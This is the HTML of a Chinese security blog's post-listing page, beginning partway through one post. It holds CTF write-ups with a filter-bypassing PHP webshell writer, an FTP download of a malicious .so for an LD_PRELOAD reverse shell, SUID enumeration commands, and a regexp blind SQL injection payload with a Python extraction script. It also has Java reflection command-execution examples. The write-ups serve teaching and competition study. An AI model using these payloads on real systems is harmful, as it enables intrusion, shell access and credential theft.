<span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>发现确实过滤了很多东西，但是我们现在可以通过拼接绕过，接下来就是考虑如何写入webshell 了,直接贴一下大师傅的文章，利用的是内置类SplFileObject::fwrite写入内容，并且使用define定义常量将其写入文件中，没见过的姿势，学习了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;EV&quot;</span>, <span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;GETCONT&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>);</span><br><span class="line"><span class="comment">// 由于禁止了$，我们只能从已有的地方获取$符</span></span><br><span class="line">define(<span class="string">&quot;D&quot;</span>,(GETCONT)(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)[<span class="number">353</span>]);</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.EV.<span class="string">&quot;(&quot;</span>.D.<span class="string">&quot;_POST[&#x27;a&#x27;]);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (GETCONT)(<span class="string">&#x27;./shell.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::fwrite(SHELL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;PHARA&quot;</span>, <span class="keyword">new</span> splf(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>获得一句话木马的shell以后，就需要绕一下disable_function了，这里一般考虑的也是写入ld更改环境变量</p>
<p>写入环境变量是通过在本地搭建一个ftp服务，然后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=</span><br><span class="line">$local_file = <span class="string">&#x27;/tmp/hack1.so&#x27;</span>;</span><br><span class="line">$server_file = <span class="string">&#x27;hack.so&#x27;</span>;</span><br><span class="line">$ftp_server = <span class="string">&#x27;110.xxxx.120&#x27;</span>;</span><br><span class="line">$ftp_port=<span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">$ftp = ftp_connect($ftp_server,$ftp_port);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$login_result = ftp_login($ftp, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">ftp_pasv($ftp,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Successfully written to <span class="subst">$local_file</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;There was a problem\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_close($ftp);</span><br></pre></td></tr></table></figure>

<p>这里值得一提的是，这个ftp服务应该是要和so文件放在同一目录下，不然就要写绝对路径（应该是这样），然后如果你要是用本来已经开启的ftp服务，需要在login那边写一下你的账号密码才行</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220327195720.png" alt="img"></p>
<p>这个时候就成功写入了，接下来就是putenv+mail函数反弹shell即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/vhosts/topleadtool.com/httpdocs/inc/hack.so&quot;</span>);</span><br><span class="line">mail(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>拿flag的时候发现权限不够，需要提权，最近的那个洞不行，所以suid尝试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>新学了几个姿势，然后就可以getshell了</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220327200526.png" alt="img"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-19T01:36:43.000Z" title="2022/3/19 上午9:36:43">2022-03-19</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-08-02T14:14:44.248Z" title="2022/8/2 下午10:14:44">2022-08-02</time></span><span class="level-item">4 minutes read (About 610 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/19/%E8%99%8E%E7%AC%A6/">2022虎符</a></h1><div class="content"><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>比赛的时候一开始没发现过滤了空格，所以一直出不了，后来才发现，所以说，对于不确定的正则表达式还是要去实际测试一下才行，然后一看就是要盲注，由于过滤了括号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.replace(&#x2F;[\s,()#;*\-]&#x2F;g, &#39;&#39;)</span><br><span class="line">.replace(&#x2F;^.*(?&#x3D;union|binary).*$&#x2F;gi, &#39;&#39;)</span><br><span class="line">.toString();</span><br></pre></td></tr></table></figure>

<p>所以首选肯定是case，接下来就是构造盲注语句了，由于是要用regexp来构造，读一下文档，发现regexp可以直接作为等号来使用，并且无需空格，可直接比对内容，一开始构造的是,问题在于直接这样是会爆出语法错误的，这个时候’1’和case直接需要有东西隔开，当时思维禁锢住了，没想到使用||。。。。傻逼了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or&#39;1&#39;&#x3D;&#39;1&#39;case&#39;1&#39;whenxxxx</span><br></pre></td></tr></table></figure>

<p>构造出来以后可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;a&#39;||case&#39;1&#39;when&#39;1&#39;then&#39;1&#39;else&#39;0&#39;end||&#39;a&#39;;</span><br></pre></td></tr></table></figure>

<p>，接下来就是使用regexp进行盲注，盲注的结果分为两种，一种是状态401，一种是状态500,500是因为报错才会产生的，所以我们就构造一个报错盲注,由于不能使用函数，所以这里可以通过数值之间的大数运算来引起报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;a&#39;||case&#39;1&#39;when&#39;1&#39;then&#39;1&#39;else~0+~0+&#39;a&#39;end||&#39;a&#39;;</span><br></pre></td></tr></table></figure>

<p>接下来就是完善最重要的regexp的盲注部分了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;||case&#39;1&#39;when&#96;username&#96;regexp&#39;^Db&#39;then&#39;1&#39;else~0+~0+&#39;a&#39;end||&#39;a&#39; limit 1;</span><br></pre></td></tr></table></figure>

<p>但是接下来还需要解决大小写问题，查阅mysql8.0的文档，发现regexp在比对的时候可以设置字符集用来表示规则（也就是可以比对大小写）但是我在本地测试的时候，发现要使用对应数据库的编码形式才可以，看了一下hint，可以发现这个数据库是使用这个编码规则的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COLLATE&#x3D;utf8mb4_0900_as_cs</span><br></pre></td></tr></table></figure>

<p>所以我们的payload也呼之欲出了,使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;||case&#39;1&#39;when&#96;username&#96;regexp&#39;a&#39;COLLATE‘utf8mb4_0900_as_cs’then&#39;1&#39;else~0+~0+&#39;a&#39;end||&#39;a</span><br></pre></td></tr></table></figure>

<p>接下来就是写成脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://110.42.133.120:8080/login&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="comment">#a=string.printable</span></span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%&amp;&#x27;/:&lt;=&gt;@[]^_`&#123;&#125;~^!$&quot;</span></span><br><span class="line">print(a)</span><br><span class="line">print(a[<span class="number">-3</span>:])</span><br><span class="line">str = <span class="string">&quot;&quot;</span><span class="comment">#aeoo</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> a[<span class="number">-3</span>:]:</span><br><span class="line">            i=i.replace(i,<span class="string">f&#x27;\\\\<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        payload=<span class="string">f&quot;a&#x27;||case&#x27;1&#x27;when`password`regexp&#x27;^<span class="subst">&#123;str+i&#125;</span>&#x27;COLLATE`utf8mb4_0900_as_cs`then&#x27;1&#x27;else~0+~0+&#x27;a&#x27;end||&#x27;a&quot;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=s.post(url,data=data).text</span><br><span class="line">        print(r)</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;401&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\\&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                i.replace(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            str+=i</span><br><span class="line">            print(<span class="string">f&quot;[+]<span class="subst">&#123;str&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-18T01:23:59.000Z" title="2022/3/18 上午9:23:59">2022-03-18</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-18T01:23:59.855Z" title="2022/3/18 上午9:23:59">2022-03-18</time></span><span class="level-item">a few seconds read (About 0 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/">区块链服务器搭建小记</a></h1><div class="content"></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-17T11:23:26.000Z" title="2022/3/17 下午7:23:26">2022-03-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-30T14:52:53.966Z" title="2022/3/30 下午10:52:53">2022-03-30</time></span><span class="level-item">6 minutes read (About 882 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/17/java%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/">java审计(三)</a></h1><div class="content"><h2 id="单例模式下如何通过反射实现命令执行"><a href="#单例模式下如何通过反射实现命令执行" class="headerlink" title="单例模式下如何通过反射实现命令执行"></a>单例模式下如何通过反射实现命令执行</h2><h3 id="getMehtod和invoke方法"><a href="#getMehtod和invoke方法" class="headerlink" title="getMehtod和invoke方法"></a>getMehtod和invoke方法</h3><p><code>getMethod</code>的作用是通过反射获取一个类的某个特定的公有方法，java中支持类的重载，我们不能仅通过函数名来确定一个函数，所以在调用getMethod的时候，我们需要传入需要获取的函数的<code>参数类型列表</code></p>
<p>例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getMethod(&quot;exec&quot;,String.class)</span><br></pre></td></tr></table></figure>

<p><code>invoke</code>的作用是执行方法，它的第一个参数是：<br>1.如果是普通方法，那么第一个参数是类对象<br>2.如果是静态方法，则第一个参数是类</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz&#x3D; Class.forName(&quot;java.lang.runtime&quot;);</span><br><span class="line">        clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exec&quot;);</span><br></pre></td></tr></table></figure>

<p>将上述paylaod分解完以后可得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz&#x3D;Class.forName(&quot;java.lang.runtime&quot;);</span><br><span class="line">Method execMethod&#x3D;clazz.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">Method getRuntimeMethod&#x3D;clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Object runtime &#x3D;getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,&quot;calc.exec&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor"></a>getConstructor</h2><p>1.<code>getConstructor</code>接收的参数是构造函数列表类型，<br>2.获取到构造函数后，使用<code>newInstance</code>来执行</p>
<p>eg:<br>使用反射获取ProcessBuilder的构造函数，然后调用start()来执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz&#x3D;Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cacl.exe&quot;))).start();</span><br></pre></td></tr></table></figure>

<p><code>ProcessBuilder</code>有两个构造函数：</p>
<p>1.<code>public ProcessBuilder(List&lt;string&gt; command)</code><br>2.<code>public ProcessBuilder(String... command)</code></p>
<p>但是第一个形式使用了强制类型转化（区别看下面）</p>
<p>但是在表达式上下文中没有此语法，因此需要利用反射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>通过getMethod(“start”)获取到start方法，然后invoke执行，invoke的第一个参数就是ProcessBuilder Object。</p>
<p>对比一下两者的区别，前者是强制转化为函数来执行命令了，后者是通过反射调用类和方法来执行。</p>
<h4 id="可变长参数"><a href="#可变长参数" class="headerlink" title="可变长参数"></a>可变长参数</h4><p>可变长参数，java在编译的时候会编译成一个数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void hello(String[] names)&#123;&#125;</span><br><span class="line">public void hello(String...names)&#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>对于反射而言，如果要获取的目标函数里包含可边长参数，则只需将其作为数组即可。</p>
<p>将字符串数组的类String[].class传给getConstructor,获取ProcessBuilder的第二种构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz=class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure>

<p>在调用<code>newInstance</code>的时候，接受的是一个可变长参数，我们传给ProcessBuilder的也是，二者叠加变成二维数组<br>payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<h2 id="私有方法进行反射"><a href="#私有方法进行反射" class="headerlink" title="私有方法进行反射"></a>私有方法进行反射</h2><p><code>getDeclared</code>:<br>1.getMethod系列方法获取的是当前类中的所有公共方法，包括从父类继承的方法<br>2.getDeclaredMethod系列方法获取的是当前类中声明的方法，是写在这个类里的，包括私有的方法，但从父类哪里继承来的就不包含了</p>
<p><strong>差异</strong>：大概就是getDeclaredMethod可以直接获得到类的私有对象并且可以实例化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<p>而<code>setAccessible</code>作用在于修改作用域，否则无法调用</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>看了这么多，大概总结一下，其实就是区分不同情况如何实现命令执行，单利模式，私有方法，使用getMethod或者使用getConstructor，或者是getDeclared来调用其方法，然后在这之前需要用forname，或者是其他方法来获取到这个对象，才可调用其方法</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-17T07:45:47.000Z" title="2022/3/17 下午3:45:47">2022-03-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-17T07:45:47.809Z" title="2022/3/17 下午3:45:47">2022-03-17</time></span><span class="level-item">a few seconds read (About 0 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/17/git%E5%8F%AF%E8%A7%86%E5%8C%96%E6%95%99%E7%A8%8B/">git可视化教程</a></h1><div class="content"></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-14T09:56:39.000Z" title="2022/3/14 下午5:56:39">2022-03-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-14T11:22:53.126Z" title="2022/3/14 下午7:22:53">2022-03-14</time></span><span class="level-item">7 minutes read (About 1087 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/14/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/">java审计入门（一）</a></h1><div class="content"><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这几天一直陆陆续续在学java的代码审计，但是总感觉学的不是很顺畅，所以去《代码审计》星球看了一个入门的panda师傅写的java审计，一开始的基础知识就跟着打一遍吧</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-包的命名规范"><a href="#1-包的命名规范" class="headerlink" title="1.包的命名规范"></a>1.包的命名规范</h3><p>（1）indi:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">个体项目：指个人发起，但非自己独立完成的项目，可公开或私有项目，copyright主要属于发起者</span><br><span class="line">包名为:indi.发起者名.项目名.模块名.。。。</span><br></pre></td></tr></table></figure>

<p>（2）pers:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">个人项目:指个人发起，独自完成，可分享的项目，copyright主要属于个人。</span><br><span class="line">包名为pers.个人名.项目名.模块名.。。。</span><br></pre></td></tr></table></figure>

<p>(3)priv:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">私有项目:指个人发起，独立完成，非公开的私人使用的项目，copyright属于个人</span><br><span class="line">包名为priv.个人名.项目名.模块名.。。。</span><br></pre></td></tr></table></figure>

<p>（4）onem:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与indi 相同，推荐使用indi</span><br></pre></td></tr></table></figure>

<p>（5）team:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">团队项目，指由团队发起，并由该团队开发的项目，copyright属于该团队所有</span><br><span class="line">包名为:team.团队名.项目名.模块名.。。。</span><br></pre></td></tr></table></figure>

<p>（6）com：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">公司项目，copyright由项目发起的公司所有</span><br><span class="line">包名为:com.公司名.项目名.模块名.。。。</span><br></pre></td></tr></table></figure>

<p>持久层：dao、persist、mapper<br>实体类：entity、model、bean、javabean、pojo<br>业务逻辑：service、biz<br>控制器：controller、servlet、action、web<br>过滤器：filter<br>异常：exception<br>监听器：listener<br>在不同的框架下一班包的命名规则不同，但大概如上，<strong>不同功能</strong>的java文件放在不同的包中，根据java文件的功能统一安放及命名。</p>
<h3 id="2-servlet"><a href="#2-servlet" class="headerlink" title="2.servlet"></a>2.servlet</h3><h4 id="什么是servlet？"><a href="#什么是servlet？" class="headerlink" title="什么是servlet？"></a>什么是servlet？</h4><p>java Servlet是运行在web服务器或应用服务器上的程序，它是作为来自web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。</p>
<p>Servlet执行以下任务：</p>
<ul>
<li><p>读取客户端（浏览器）发送的显示的数据，包括网页上的HTML表单，或者也可以是来自applet或自定义的HTTP客户端程序的表单。</p>
</li>
<li><p>读取客户端（浏览器）发送的隐式的HTTP请求数据。这包括cookies、媒体类型和浏览器能理解的压缩格式等</p>
</li>
<li><p>处理数据并生成结果，这个过程可能需要访问数据库，执行RMI或CORBA调用，调用web服务，或者直接计算得出对应的响应。</p>
</li>
<li><p>发送显示的数据（即文档）到客户端（浏览器）。该文档的格式可以是多种多样的，包括文本文件（html或xml）、二进制文件（GIF图像）、excel等。</p>
</li>
<li><p>发送隐式的http响应到客户端（浏览器）。这包括告诉浏览器或其他客户端被返回的文档类型（如html），设置cookies和缓存参数，以及其他类似的任务。</p>
</li>
</ul>
<h4 id="Servlet-生命周期"><a href="#Servlet-生命周期" class="headerlink" title="Servlet 生命周期"></a>Servlet 生命周期</h4><p>Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程：</p>
<ul>
<li>Servlet 通过调用<code> init () </code>方法进行初始化。</li>
<li>Servlet 调用 <code>service() </code>方法来处理客户端的请求。</li>
<li>Servlet 通过调用<code> destroy() </code>方法终止（结束）。</li>
</ul>
<p>最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。</p>
<p>这里主要介绍一下<code>service() </code>方法。</p>
<p><code>service() </code>方法是执行实际任务的主要方法，Servlet 容器（即 Web 服务器）调用 <code>service() </code>方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。每次服务器接收到一个 Servlet 请求时，服务器会产生一个新的线程并调用服务。<code>service() </code>方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest request, ServletResponse response)</span> </span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码，即为一个<code>service()</code>方法的特征</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-14T07:33:23.000Z" title="2022/3/14 下午3:33:23">2022-03-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-14T09:14:49.338Z" title="2022/3/14 下午5:14:49">2022-03-14</time></span><span class="level-item">a few seconds read (About 27 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/14/%E4%BD%BF%E7%94%A8java%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8Bdocker%E5%AE%B9%E5%99%A8debug/">使用java进行远程docker容器debug</a></h1><div class="content"><p>首先从docker中将启动的jar包打包出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp 7d:&#x2F;opt&#x2F;solr&#x2F;server&#x2F;start.jar D:\javaprogram\log4j2</span><br></pre></td></tr></table></figure>

</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/3/">Previous</a></div><div class="pagination-next"><a href="/page/5/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link is-current" href="/page/4/">4</a></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/26/">26</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="Your name"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Your name</p><p class="is-size-6 is-block">Your title</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Your location</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">255</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">18</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-14T05:23:36.000Z">2023-02-14</time></p><p class="title"><a href="/2023/02/14/access%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-20T06:32:13.000Z">2023-01-20</time></p><p class="title"><a href="/2023/01/20/java-jndi%E6%B3%A8%E5%85%A5/">java-jndi注入</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-15T06:32:13.000Z">2023-01-15</time></p><p class="title"><a href="/2023/01/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">shiro反序列化漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-12T06:32:13.000Z">2023-01-12</time></p><p class="title"><a href="/2023/01/12/javacc4/">java-cc4、cc2、cc5、cc7</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-10T06:32:13.000Z">2023-01-10</time></p><p class="title"><a href="/2023/01/10/java_cc%E9%93%BE%E5%B0%8F%E7%BB%93/">java_cc链小结</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">February 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">January 2023</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span 